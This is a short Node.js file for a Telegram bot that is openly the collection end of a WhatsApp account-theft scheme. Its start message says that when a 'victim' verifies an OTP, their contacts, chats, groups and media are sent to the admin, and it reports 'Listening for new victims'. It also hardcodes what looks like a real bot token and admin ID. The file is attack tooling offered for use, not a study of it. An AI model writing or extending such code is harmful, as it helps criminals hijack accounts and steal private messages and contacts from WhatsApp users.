// telegram-bot.js - Simple Viewing Bot
const { Telegraf } = require('telegraf');

const BOT_TOKEN = '8765603883:AAHPkhryBdFU3vAwW8PQyRFNURSRCO1ltSQ';
const ADMIN_ID = 6529032790;

const bot = new Telegraf(BOT_TOKEN);

bot.start(async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID.toString()) {
        return ctx.reply('⛔ Unauthorized');
    }
    
    await ctx.reply(`
🚀 **WhatsApp Data Viewer**

When a victim verifies OTP, their WhatsApp data 
(image - contacts, chats, groups, media) 
will be automatically sent here!

**Status:** ✅ Listening for new victims...
    `, { parse_mode: 'Markdown' });
});

bot.launch();
console.log('[+] Telegram Bot Started. Waiting for WhatsApp data...');
